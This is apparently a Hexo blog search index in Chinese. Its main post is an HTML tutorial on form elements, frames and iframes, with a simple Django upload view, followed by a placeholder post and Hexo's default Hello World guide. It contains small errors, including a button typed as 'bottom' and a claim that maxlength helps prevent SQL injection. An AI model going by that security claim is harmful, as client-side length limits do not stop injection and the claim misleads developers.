align="center">规定在被提交表单中使用的字符集（默认：页面字符集）。</td></tr><tr><td align="center">action</td><td align="center">规定向何处提交表单的地址（URL）（提交页面）。</td></tr><tr><td align="center">autocomplete</td><td align="center">规定浏览器应该自动完成表单（默认：开启）。</td></tr><tr><td align="center">enctype</td><td align="center">规定被提交数据的编码（默认：url-encoded）。</td></tr><tr><td align="center">method</td><td align="center">规定在提交表单时所用的 HTTP 方法（默认：GET）。</td></tr><tr><td align="center">name</td><td align="center">规定识别表单的名称（对于 DOM 使用：document.forms.name）。</td></tr><tr><td align="center">novalidate</td><td align="center">规定浏览器不验证表单。</td></tr><tr><td align="center">target</td><td align="center">规定 action 属性中地址的目标（默认：_self）。</td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center">表单元素</td><td align="center"></td></tr></tbody></table><p>基本概念：<br>HTML表单是HTML元素中较为复杂的部分，表单往往和脚本、动态页面、数据处理等功能相结合，因此它是制作动态网站很重要的内容。<br>表单一般用来收集用户的输入信息<br>表单工作原理：<br>访问者在浏览有表单的网页时，可填写必需的信息，然后按某个按钮提交。这些信息通过Internet传送到服务器上。<br>服务器上专门的程序对这些数据进行处理，如果有错误会返回错误信息，并要求纠正错误。当数据完整无误后，服务器反馈一个输入完成的信息。</p><p>Django接收上传文件代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from django.conf.urls import url</span><br><span class="line">from django.shortcuts import HttpResponse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def upload(request):</span><br><span class="line">    print(&quot;request.GET:&quot;, request.GET)</span><br><span class="line">    print(&quot;request.POST:&quot;, request.POST)</span><br><span class="line"></span><br><span class="line">    if request.FILES:</span><br><span class="line">        filename &#x3D; request.FILES[&quot;file&quot;].name</span><br><span class="line">        with open(filename, &#39;wb&#39;) as f:</span><br><span class="line">            for chunk in request.FILES[&#39;file&#39;].chunks():</span><br><span class="line">                f.write(chunk)</span><br><span class="line">            return HttpResponse(&#39;上传成功&#39;)</span><br><span class="line">    return HttpResponse(&quot;收到了！&quot;)</span><br><span class="line"></span><br><span class="line">urlpatterns &#x3D; [</span><br><span class="line">    url(r&#39;^upload&#x2F;&#39;, upload),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h4 id="input"><a href="#input" class="headerlink" title="input"></a>input</h4><p><code>&lt;input&gt; </code>元素会根据不同的 type 属性，变化为多种形态。</p><table><thead><tr><th align="center">type属性值</th><th align="center">表现形式</th><th align="center">对应代码</th></tr></thead><tbody><tr><td align="center">text</td><td align="center">单行输入文本</td><td align="center"><code>&lt;input type=&quot;text&quot;/&gt;</code></td></tr><tr><td align="center">password</td><td align="center">密码输入框</td><td align="center"><code>&lt;input type=&quot;password&quot;/&gt;</code></td></tr><tr><td align="center">date</td><td align="center">日期输入框</td><td align="center"><code>&lt;input type=&quot;date&quot;/&gt;</code></td></tr><tr><td align="center">checkbox</td><td align="center">复选框</td><td align="center"><code>&lt;input type=&quot;checkbox&quot; checked=&quot;checked&quot;/&gt;</code></td></tr><tr><td align="center">radio</td><td align="center">单选框</td><td align="center"><code>&lt;input type=&quot;radio&quot;/</code>&gt;</td></tr><tr><td align="center">submit</td><td align="center">提交按钮</td><td align="center"><code>&lt;input type=&quot;submit&quot;/&gt;</code></td></tr><tr><td align="center">reset</td><td align="center">重置按钮</td><td align="center"><code>&lt;input type=&quot;reset&quot;/&gt;</code></td></tr><tr><td align="center">button</td><td align="center">普通按钮</td><td align="center"><code>&lt;input type=&quot;bottom&quot;/&gt;</code></td></tr><tr><td align="center">hidden</td><td align="center">隐藏输入框</td><td align="center"><code>&lt;input type=&quot;hidden&quot;/&gt;</code></td></tr><tr><td align="center">file</td><td align="center">文本选择框</td><td align="center"><code>&lt;input type=&quot;file&quot;/&gt;</code></td></tr></tbody></table><p>属性说明:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&lt;input&gt; type 属性：</span><br><span class="line"></span><br><span class="line">  text  文本框输入（默认text文本框类型）。</span><br><span class="line"></span><br><span class="line">            autocomplete（自动完成输入的内容，要求表单元素要有name属性才有自动完成的效果，off表示自动完成不可用，on表示自动完成可用）</span><br><span class="line"></span><br><span class="line">            disabled（设置或者获取控件的状态，默认是false即可用，等于true时不可用，不能输入内容）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">　　　 password  密码框。（以下属性text和password共有）</span><br><span class="line"></span><br><span class="line">            size（指定表单元素的初始宽度。当type为text或password时，表单元素的大小以字符为单位，对于其他元素，宽度以像素为单位）</span><br><span class="line"></span><br><span class="line">            maxlength（type为text或password时，表示输入的最大字符数），有利于防止sql的注入攻击</span><br><span class="line"></span><br><span class="line">            readonly：text和password只读.　</span><br><span class="line"></span><br><span class="line">　　　　　　placeholder 框内预置内容(灰色)，写上内容时才消失</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       radio  单选按钮。属性：</span><br><span class="line"></span><br><span class="line">             name（将name的值设置为相同值，才表示一组数据，才能实现单选功能）</span><br><span class="line"></span><br><span class="line">             value（必须要写，提交到服务器的key值，实际开发过程中value一般是编号）</span><br><span class="line"></span><br><span class="line">             checked（是否被选中的状态）</span><br><span class="line"></span><br><span class="line">       checkbox  复选框。</span><br><span class="line"></span><br><span class="line">             name（名字一定要一样一样的，才表示是一组数据，添加到同一value值列表提交到服务器）</span><br><span class="line"></span><br><span class="line">             value（必须要写，提交到服务器的key值，实际开发过程中value一般是编号）</span><br><span class="line"></span><br><span class="line">             checked（是否被选中的状态）</span><br><span class="line"></span><br><span class="line">       file  文件域，上传文件（不同的浏览器表现形式不同）</span><br><span class="line"></span><br><span class="line">　　　　submit  提交按钮。用于提交表单。</span><br><span class="line"></span><br><span class="line">　　　　reset  重置按钮。清空表单的输入，恢复到表单默认的状态。</span><br><span class="line"></span><br><span class="line">       button  普通按钮。一般结合javascript使用。</span><br><span class="line"></span><br><span class="line">　　　　image  图片按钮，用来提交表单，与submit是一样的效果。</span><br><span class="line"></span><br><span class="line">             src（图片路径）</span><br><span class="line"></span><br><span class="line">　　　　hidden  隐藏字段。</span><br><span class="line"></span><br><span class="line">             value（隐藏的内容）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">　　　　color  颜色标签。value指定颜色值（采用#十六进制数表示）。</span><br><span class="line"></span><br><span class="line">　　　　date  日期。value值指定默认的日期，格式为****-**-**（年月日）。</span><br><span class="line"></span><br><span class="line">　　　　datetime-local  显示本地时间，value值指定默认的时间，格式为2016-05-20T11:10:10（年月日T时分秒）。 </span><br><span class="line"></span><br><span class="line">　　　　number  数字向上或者向下滑动。可以填数字然后向上或者向下选择不同的值。</span><br><span class="line"></span><br><span class="line">　　　　range  滑动标签。min（指定最小值）、max（指定最大值）、value（指定当前默认值）。</span><br><span class="line"></span><br><span class="line">　　　　week  每年的周数。value指定哪一年第几周，格式为2016-W25（2016年第25周）。</span><br><span class="line"></span><br><span class="line">   value: 表单提交项的值</span><br><span class="line"></span><br><span class="line">   对于不同的输入类型，value 属性的用法也不同：</span><br><span class="line">   type&#x3D;&quot;button&quot;, &quot;reset&quot;, &quot;submit&quot; - 定义按钮上的显示的文本</span><br><span class="line">   type&#x3D;&quot;text&quot;, &quot;password&quot;, &quot;hidden&quot; - 定义输入字段的初始值</span><br><span class="line">   type&#x3D;&quot;checkbox&quot;, &quot;radio&quot;, &quot;image&quot; - 定义与输入相关联的值</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">百度搜索实例</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">        &lt;form action&#x3D;&quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;s&quot;&gt;</span><br><span class="line">            &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;wd&quot;&gt;</span><br><span class="line">            &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;百度一下&quot;&gt;</span><br><span class="line">        &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h4 id="select标签"><a href="#select标签" class="headerlink" title="select标签"></a>select标签</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">  &lt;select name&#x3D;&quot;city&quot; id&#x3D;&quot;city&quot;&gt;</span><br><span class="line">    &lt;option value&#x3D;&quot;1&quot;&gt;北京&lt;&#x2F;option&gt;</span><br><span class="line">    &lt;option selected&#x3D;&quot;selected&quot; value&#x3D;&quot;2&quot;&gt;上海&lt;&#x2F;option&gt;</span><br><span class="line">    &lt;option value&#x3D;&quot;3&quot;&gt;广州&lt;&#x2F;option&gt;</span><br><span class="line">    &lt;option value&#x3D;&quot;4&quot;&gt;深圳&lt;&#x2F;option&gt;</span><br><span class="line">  &lt;&#x2F;select&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><p>属性说明：</p><ul><li>multiple：布尔属性，设置后为多选，否则默认单选</li><li>disabled：禁用</li><li>selected：默认选中该项</li><li>value：定义提交时的选项值</li></ul><h4 id="label标签"><a href="#label标签" class="headerlink" title="label标签"></a>label标签</h4><p>定义：<label> 标签为 input 元素定义标注（标记）。<br>说明：</p><ol><li>label 元素不会向用户呈现任何特殊效果。</li><li><label> 标签的 for 属性值应当与相关元素的 id 属性值相同。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;&quot;&gt;</span><br><span class="line">  &lt;label for&#x3D;&quot;username&quot;&gt;用户名&lt;&#x2F;label&gt;</span><br><span class="line">  &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;username&quot; name&#x3D;&quot;username&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure></li></ol><h4 id="textarea-多行文本"><a href="#textarea-多行文本" class="headerlink" title="textarea 多行文本"></a>textarea 多行文本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea name&#x3D;&quot;memo&quot; id&#x3D;&quot;memo&quot; cols&#x3D;&quot;32&quot; rows&#x3D;&quot;12&quot;&gt;</span><br><span class="line">  默认内容</span><br><span class="line">&lt;&#x2F;textarea&gt;</span><br></pre></td></tr></table></figure><p>属性说明：</p><ul><li>name：名称</li><li>rows：行数</li><li>cols：列数</li><li>disabled：禁用</li></ul><br><hr>## 框架<h3 id="lt-frameset-gt-框架"><a href="#lt-frameset-gt-框架" class="headerlink" title="&lt;frameset&gt; 框架"></a><code>&lt;frameset&gt; </code>框架</h3><p>用来划分窗体，不能放在<body>中，否则没有效果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cols （纵向分割页面。其数值表示方法有三种：“30%、30（或者30px）、*”；数值的个数代表分成的视窗数目且数值之间用“,”隔开。“30%”表示该框架区域占全部浏览器页面区域的30%；“30”表示该区域横向宽度为30像素；“*”表示该区域占用余下页面空间。例如：cols&#x3D;&quot;25%,200,*&quot; 表示将页面分为三部分，左面部分占页面30%，中间横向宽度为200像素，页面余下的作为右面部分。）</span><br><span class="line"></span><br><span class="line">   rows（横向分割页面。属性和cols一样）</span><br><span class="line"></span><br><span class="line">   frameborder（设置是否显示框架边框。设定值只有0、1；0 表示不要边框，1 表示要显示边框）</span><br><span class="line"></span><br><span class="line">   border（框架之间的距离，一般设置为0）</span><br><span class="line"></span><br><span class="line">   bordercolor（边框的颜色）</span><br><span class="line"></span><br><span class="line">   framespacing（设置框架与框架间的保留的空白距离）</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. &lt;frameset cols&#x3D;&quot;40%,*,*&quot;&gt; 第一个框架占整个浏览器窗口的40%,剩下的空间平均分配给另外两个框架。</span><br><span class="line">2. &lt;frameset cols&#x3D;&quot;*,*,*,*&quot;&gt; 浏览器窗口等分为四部分。&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### &#96;&lt;iframe&gt;&#96; 框架</span><br><span class="line"></span><br><span class="line">元素会创建包含另外一个文档的内联框架（即行内框架）</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>name （设置框架名称。此为必须设置的属性）src （设置此框架要显示的网页名称或路径。此为必须设置的属性）scrolling （设置是否要显示滚动条。设定值为auto, yes, no）bordercolor （设置框架的边框颜色）frameborder （设置是否显示框架边框。设定值只有0、1；0 表示不要边框，1 表示要显示边框）noresize （设置框架大小是否能手动调节）marginwidth （设置框架边界和其中内容之间的宽度）marginhight （设置框架边界和其中内容之间的高度）width（设置框架宽度）height （设置框架高度）</code></pre><p>```</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的第一篇博客文章</title>
      <link href="posts/15650.html"/>
      <url>posts/15650.html</url>
      
        <content type="html"><![CDATA[<h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><p>内容</p><hr><h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><p>内容</p><hr><p>##参考文献</p><p><a href="http://www.lqsblog.cn/">www.lqsblog.cn</a></p>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="posts/16107.html"/>
      <url>posts/16107.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><h3 id="创建new-page"><a href="#创建new-page" class="headerlink" title="创建new page"></a>创建new page</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1，创建一般的文章：hexo new <span class="string">&quot;文章名称&quot;</span></span><br><span class="line">2，创建菜单栏中的等页面 eg:<span class="string">&quot;标签&quot;</span>等，：hexo new page <span class="string">&quot;about&quot;</span>这里的about要和你用的主题()的_config.yml文件中的menu中进行匹配</span><br><span class="line">如：menu:</span><br><span class="line">Index: /</span><br><span class="line">Tags: /Tags</span><br><span class="line">About: /about</span><br><span class="line"></span><br><span class="line">找到新建的文件夹 /<span class="built_in">source</span>/about下的index.md文件</span><br><span class="line">vim index.md 进到文件中修改其front-matter</span><br><span class="line">格式如下：</span><br><span class="line">---</span><br><span class="line">title: about</span><br><span class="line">date: xxxxx</span><br><span class="line"><span class="built_in">type</span>: about // 帮助脚本识别这是一个用来创建tags的文档</span><br><span class="line">layout: about // 我的tags模版标签叫tag你可以根据你的模版名称输入对应的名称</span><br><span class="line">---</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
